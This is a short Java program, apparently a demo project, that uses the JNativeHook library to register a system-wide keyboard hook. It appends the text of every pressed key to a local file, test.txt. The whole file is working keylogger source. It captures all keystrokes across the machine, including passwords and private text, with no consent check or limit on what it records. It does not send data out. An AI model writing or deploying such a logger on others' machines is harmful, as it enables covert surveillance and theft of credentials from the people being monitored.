import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.BufferedOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.OutputStream;
import java.nio.file.Files;
import java.util.logging.Level;
import java.util.logging.Logger;

import static java.nio.file.StandardOpenOption.APPEND;
import static java.nio.file.StandardOpenOption.CREATE;

public class Application implements NativeKeyListener {

    private Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());

    private static File file;

    static {
        file = new File("src/main/resources/test.txt");
    }

    public static void main(String[] args) {
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException ex) {
            System.err
                    .println("There was a problem registering the native hook.");
            System.err.println(ex.getMessage());

            System.exit(1);
        }

        Application app = new Application();
        app.logger.setLevel(Level.WARNING);

        GlobalScreen.addNativeKeyListener(app);
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        String key = NativeKeyEvent.getKeyText(e.getKeyCode());
        byte[] data = key.getBytes();

        try (OutputStream out = new BufferedOutputStream(
                Files.newOutputStream(file.toPath(), CREATE, APPEND))) {
            out.write(data, 0, data.length);
        } catch (IOException x) {
            System.err.println(x);
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
    }
}
